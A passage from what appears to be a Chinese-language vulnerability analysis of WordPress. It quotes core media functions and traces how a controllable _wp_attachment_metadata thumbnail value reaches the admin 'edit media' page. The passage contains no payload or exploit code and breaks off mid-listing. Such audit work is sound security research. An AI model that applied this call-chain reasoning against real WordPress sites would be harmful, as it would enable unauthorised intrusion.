);</span><br><span class="line">	<span class="keyword">if</span> (! <span class="variable">$post</span> ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$data</span> = <span class="title function_ invoke__">get_post_meta</span>(<span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_wp_attachment_metadata&#x27;</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$unfiltered</span> ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Filters the attachment meta data.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> array|bool $data          Array of meta data for the given attachment, or false</span></span><br><span class="line"><span class="comment">	 *                                  if the object does not exist.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> int        $attachment_id Attachment post ID.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;wp_get_attachment_metadata&#x27;</span>, <span class="variable">$data</span>, <span class="variable">$post</span>-&gt;ID );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 可以看到 imagedata 就是数据库中的 _wp_attachment_metadata 字段，而该字段也是可控的。在可以完全控制 thumbfile 以后我们需要找到一个可以调用 wp_get_attachment_thumb_file 函数的地方。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-includes/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Scale an image to fit a particular size (such as &#x27;thumb&#x27; or &#x27;medium&#x27;).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The URL might be the original image, or it might be a resized version. This</span></span><br><span class="line"><span class="comment"> * function won&#x27;t create a new resized copy, it will just return an already</span></span><br><span class="line"><span class="comment"> * resized one if it exists.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A plugin may use the &#123;<span class="doctag">@see</span> &#x27;image_downsize&#x27;&#125; filter to hook into and offer image</span></span><br><span class="line"><span class="comment"> * resizing services for images. The hook must return an array with the same</span></span><br><span class="line"><span class="comment"> * elements that are normally returned from the function.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int          $id   Attachment ID for image.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|int [] $size Optional. Image size to scale to. Accepts any valid image size name,</span></span><br><span class="line"><span class="comment"> *                           or an array of width and height values in pixels (in that order).</span></span><br><span class="line"><span class="comment"> *                           Default &#x27;medium&#x27;.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array|false &#123;</span></span><br><span class="line"><span class="comment"> *     Array of image data, or boolean false if no image is available.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> string $0 Image source URL.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> int    $1 Image width in pixels.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> int    $2 Image height in pixels.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> bool   $3 Whether the image is a resized image.</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">image_downsize</span>(<span class="params"> <span class="variable">$id</span>, <span class="variable">$size</span> = <span class="string">&#x27;medium&#x27;</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$intermediate</span> ) &#123;</span><br><span class="line">		<span class="variable">$img_url</span>         = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$img_url_basename</span>, <span class="variable">$intermediate</span>[<span class="string">&#x27;file&#x27;</span>], <span class="variable">$img_url</span> );</span><br><span class="line">		<span class="variable">$width</span>           = <span class="variable">$intermediate</span>[<span class="string">&#x27;width&#x27;</span>];</span><br><span class="line">		<span class="variable">$height</span>          = <span class="variable">$intermediate</span>[<span class="string">&#x27;height&#x27;</span>];</span><br><span class="line">		<span class="variable">$is_intermediate</span> = <span class="literal">true</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (<span class="string">&#x27;thumbnail&#x27;</span> === <span class="variable">$size</span> ) &#123;</span><br><span class="line">		<span class="comment">// Fall back to the old thumbnail.</span></span><br><span class="line">		<span class="variable">$thumb_file</span> = <span class="title function_ invoke__">wp_get_attachment_thumb_file</span>(<span class="variable">$id</span> );</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>image_downsize 函数的作用就是将一个附件转换为不同尺寸的缩略图，如果 size 是 thumbnail 的话就可以直接调用 wp_get_attachment_thumb_file，那么再看有没有什么地方调用了 image_downsize 函数，并且 size 是 thumbnail。由于 WordPress 的媒体页面中可以很明显看到提供了多种尺寸的附件缩略图，所以肯定可以找到满足要求的调用点。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-admin/includes/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve HTML for the size radio buttons with the specified one checked.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.7.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> WP_Post     $post</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool|string $check</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">image_size_input_fields</span>(<span class="params"> <span class="variable">$post</span>, <span class="variable">$check</span> = <span class="string">&#x27;&#x27;</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="variable">$size_names</span> = <span class="title function_ invoke__">apply_filters</span>(</span><br><span class="line">		<span class="string">&#x27;image_size_names_choose&#x27;</span>,</span><br><span class="line">		<span class="keyword">array</span>(</span><br><span class="line">			<span class="string">&#x27;thumbnail&#x27;</span> =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Thumbnail&#x27;</span> ),</span><br><span class="line">			<span class="string">&#x27;medium&#x27;</span>    =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Medium&#x27;</span> ),</span><br><span class="line">			<span class="string">&#x27;large&#x27;</span>     =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Large&#x27;</span> ),</span><br><span class="line">			<span class="string">&#x27;full&#x27;</span>      =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Full Size&#x27;</span> ),</span><br><span class="line">		)</span><br><span class="line">	);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$size_names</span> <span class="keyword">as</span> <span class="variable">$size</span> =&gt; <span class="variable">$label</span> ) &#123;</span><br><span class="line">		<span class="variable">$downsize</span> = <span class="title function_ invoke__">image_downsize</span>(<span class="variable">$post</span>-&gt;ID, <span class="variable">$size</span> );</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="variable">$html</span> = <span class="string">&quot;&lt;div class=&#x27;image-size-item&#x27;&gt;&lt;input type=&#x27;radio&#x27; &quot;</span> . <span class="title function_ invoke__">disabled</span>(<span class="variable">$enabled</span>, <span class="literal">false</span>, <span class="literal">false</span> ) . <span class="string">&quot;name=&#x27;attachments [<span class="subst">$post</span>-&gt;ID][image-size]&#x27; id=&#x27;<span class="subst">&#123;$css_id&#125;</span>&#x27; value=&#x27;<span class="subst">&#123;$size&#125;</span>&#x27;<span class="subst">$checked</span> /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;label for=&#x27;<span class="subst">&#123;$css_id&#125;</span>&#x27;&gt;<span class="subst">$label</span>&lt;/label&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;label&#x27;</span> =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Size&#x27;</span> ),</span><br><span class="line">		<span class="string">&#x27;input&#x27;</span> =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;html&#x27;</span>  =&gt; <span class="title function_ invoke__">join</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$out</span> ),</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 可以看到在 foreach 中对每一个 size 进行遍历，而 size_names 中刚好有 thumbnail，可以成功触发 image_downsize。通过分析函数，可以看到该函数的作用是构造 HTML 表单，那么很幸运，即然这个函数要输出 HTML，可以通过接口调用该函数的可能性就更大了，再找一找哪里可以触发该函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-admin/includes/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieves the attachment fields to edit form fields.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> WP_Post $post</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array   $errors</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_attachment_fields_to_edit</span>(<span class="params"> <span class="variable">$post</span>, <span class="variable">$errors</span> = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">// This was formerly in image_attachment_fields_to_edit ().</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="string">&#x27;image&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="variable">$post</span>-&gt;post_mime_type, <span class="number">0</span>, <span class="number">5</span> ) ) &#123;</span><br><span class="line">		<span class="variable">$alt</span> = <span class="title function_ invoke__">get_post_meta</span>(<span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$alt</span> ) ) &#123;</span><br><span class="line">			<span class="variable">$alt</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$form_fields</span>[<span class="string">&#x27;post_title&#x27;</span>][<span class="string">&#x27;required&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$form_fields</span>[<span class="string">&#x27;image_alt&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">			<span class="string">&#x27;value&#x27;</span> =&gt; <span class="variable">$alt</span>,</span><br><span class="line">			<span class="string">&#x27;label&#x27;</span> =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Alternative Text&#x27;</span> ),</span><br><span class="line">			<span class="string">&#x27;helps&#x27;</span> =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Alt text for the image, e.g. &amp;#8220;The Mona Lisa&amp;#8221;&#x27;</span> ),</span><br><span class="line">		);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$form_fields</span>[<span class="string">&#x27;align&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">			<span class="string">&#x27;label&#x27;</span> =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Alignment&#x27;</span> ),</span><br><span class="line">			<span class="string">&#x27;input&#x27;</span> =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;html&#x27;</span>  =&gt; <span class="title function_ invoke__">image_align_input_fields</span>(<span class="variable">$post</span>, <span class="title function_ invoke__">get_option</span>(<span class="string">&#x27;image_default_align&#x27;</span> ) ),</span><br><span class="line">		);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$form_fields</span>[<span class="string">&#x27;image-size&#x27;</span>] = <span class="title function_ invoke__">image_size_input_fields</span>(<span class="variable">$post</span>, <span class="title function_ invoke__">get_option</span>(<span class="string">&#x27;image_default_size&#x27;</span>, <span class="string">&#x27;medium&#x27;</span> ) );</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">unset</span>(<span class="variable">$form_fields</span>[<span class="string">&#x27;image_alt&#x27;</span>] );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">    	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Filters the attachment fields to edit.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> array   $form_fields An array of attachment form fields.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> WP_Post $post        The WP_Post attachment object.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="variable">$form_fields</span> = <span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;attachment_fields_to_edit&#x27;</span>, <span class="variable">$form_fields</span>, <span class="variable">$post</span> );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$form_fields</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 可以看到第 35 行 <code>$form_fields [&#39;image-size&#39;] = image_size_input_fields ($post, get_option ( &#39;image_default_size&#39;, &#39;medium&#39;) );</code> 调用了该函数，而进入该 if 分支的条件是 <code>&#39;image&#39; === substr ($post-&gt;post_mime_type, 0, 5)</code>，只要我们上传的文件 mime 是 image 就可以进入分支，那么再找找哪里调用了 get_attachment_fields_to_edit。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-admin/includes/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve HTML form for modifying the image attachment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@global</span> string $redir_tab</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int          $attachment_id Attachment ID for modification.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|array $args          Optional. Override defaults.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string HTML form for attachment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_media_item</span>(<span class="params"> <span class="variable">$attachment_id</span>, <span class="variable">$args</span> = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">	<span class="variable">$post_mime_types</span> = <span class="title function_ invoke__">get_post_mime_types</span>();</span><br><span class="line">	<span class="variable">$keys</span>            = <span class="title function_ invoke__">array_keys</span>(<span class="title function_ invoke__">wp_match_mime_types</span>(<span class="title function_ invoke__">array_keys</span>(<span class="variable">$post_mime_types</span> ), <span class="variable">$post</span>-&gt;post_mime_type ) );</span><br><span class="line">	<span class="variable">$type</span>            = <span class="title function_ invoke__">reset</span>(<span class="variable">$keys</span> );</span><br><span class="line">	<span class="variable">$type_html</span>       = <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; id=&#x27;type-of-<span class="subst">$attachment_id</span>&#x27; value=&#x27;&quot;</span> . <span class="title function_ invoke__">esc_attr</span>(<span class="variable">$type</span> ) . <span class="string">&quot;&#x27; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$form_fields</span> = <span class="title function_ invoke__">get_attachment_fields_to_edit</span>(<span class="variable">$post</span>, <span class="variable">$parsed_args</span>[<span class="string">&#x27;errors&#x27;</span>] );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$parsed_args</span>[<span class="string">&#x27;toggle&#x27;</span>] ) &#123;</span><br><span class="line">		<span class="variable">$class</span>        = <span class="keyword">empty</span>(<span class="variable">$parsed_args</span>[<span class="string">&#x27;errors&#x27;</span>] ) ? <span class="string">&#x27;startclosed&#x27;</span> : <span class="string">&#x27;startopen&#x27;</span>;</span><br><span class="line">		<span class="variable">$toggle_links</span> = <span class="string">&quot;</span></span><br><span class="line"><span class="string">		&lt;a class=&#x27;toggle describe-toggle-on&#x27; href=&#x27;#&#x27;&gt;<span class="subst">$toggle_on</span>&lt;/a&gt;</span></span><br><span class="line"><span class="string">		&lt;a class=&#x27;toggle describe-toggle-off&#x27; href=&#x27;#&#x27;&gt;<span class="subst">$toggle_off</span>&lt;/a&gt;&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$class</span>        = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="variable">$toggle_links</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="variable">$item</span> .= <span class="string">&quot;\t&lt;/tbody&gt;\n&quot;</span>;</span><br><span class="line">	<span class="variable">$item</span> .= <span class="string">&quot;\t&lt;/table&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$hidden_fields</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span> ) &#123;</span><br><span class="line">		<span class="variable">$item</span> .= <span class="string">&quot;\t&lt;input type=&#x27;hidden&#x27; name=&#x27;<span class="subst">$name</span>&#x27; id=&#x27;<span class="subst">$name</span>&#x27; value=&#x27;&quot;</span> . <span class="title function_ invoke__">esc_attr</span>(<span class="variable">$value</span> ) . <span class="string">&quot;&#x27; /&gt;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$post</span>-&gt;post_parent &lt; <span class="number">1</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;post_id&#x27;</span>] ) ) &#123;</span><br><span class="line">		<span class="variable">$parent</span>      = (<span class="keyword">int</span>) <span class="variable">$_REQUEST</span>[<span class="string">&#x27;post_id&#x27;</span>];</span><br><span class="line">		<span class="variable">$parent_name</span> = <span class="string">&quot;attachments [<span class="subst">$attachment_id</span>][post_parent]&quot;</span>;</span><br><span class="line">		<span class="variable">$item</span>       .= <span class="string">&quot;\t&lt;input type=&#x27;hidden&#x27; name=&#x27;<span class="subst">$parent_name</span>&#x27; id=&#x27;<span class="subst">$parent_name</span>&#x27; value=&#x27;<span class="subst">$parent</span>&#x27; /&gt;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 这是一个非常大的函数，该函数的作用就是构造 HTML 输出页面，其中刚好包含了构造表单的函数。那么再看哪里可以触发 get_media_item。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-admin/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Media management action handler.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> WordPress</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@subpackage</span> Administration</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Load WordPress Administration Bootstrap */</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/admin.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$parent_file</span>  = <span class="string">&#x27;upload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$submenu_file</span> = <span class="string">&#x27;upload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">wp_reset_vars</span>(<span class="keyword">array</span>(<span class="string">&#x27;action&#x27;</span> ) );</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span> ) &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">// No break.</span></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;edit&#x27;</span>:</span><br><span class="line">		<span class="variable">$title</span> = <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Edit Media&#x27;</span> );</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$errors</span> ) ) &#123;</span><br><span class="line">			<span class="variable">$errors</span> = <span class="literal">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;attachment_id&#x27;</span>] ) ) &#123;</span><br><span class="line">			<span class="title function_ invoke__">wp_redirect</span>(<span class="title function_ invoke__">admin_url</span>(<span class="string">&#x27;upload.php&#x27;</span> ) );</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$att_id</span> = (<span class="keyword">int</span>) <span class="variable">$_GET</span>[<span class="string">&#x27;attachment_id&#x27;</span>];</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        &lt;form method=<span class="string">&quot;post&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">media</span>-<span class="title">upload</span>-<span class="title">form</span>&quot; <span class="title">id</span>=&quot;<span class="title">media</span>-<span class="title">single</span>-<span class="title">form</span>&quot;&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">submit</span>&quot; <span class="title">style</span>=&quot;<span class="title">padding</span>-<span class="title">bottom</span>: 0;&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;?<span class="title">php</span> <span class="title">submit_button</span>(<span class="title">__</span>(&#x27;<span class="title">Update</span> <span class="title">Media</span>&#x27; ), &#x27;<span class="title">primary</span>&#x27;, &#x27;<span class="title">save</span>&#x27;, <span class="title">false</span> ); ?&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">	&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">media</span>-<span class="title">single</span>&quot;&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">media</span>-<span class="title">item</span>-&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">att_id</span>; ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">media</span>-<span class="title">item</span>&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">		<span class="title">echo</span> <span class="title">get_media_item</span>(</span></span><br><span class="line"><span class="class">			$<span class="title">att_id</span>,</span></span><br><span class="line"><span class="class">			<span class="title">array</span>(</span></span><br><span class="line"><span class="class">				&#x27;<span class="title">toggle</span>&#x27;     =&gt; <span 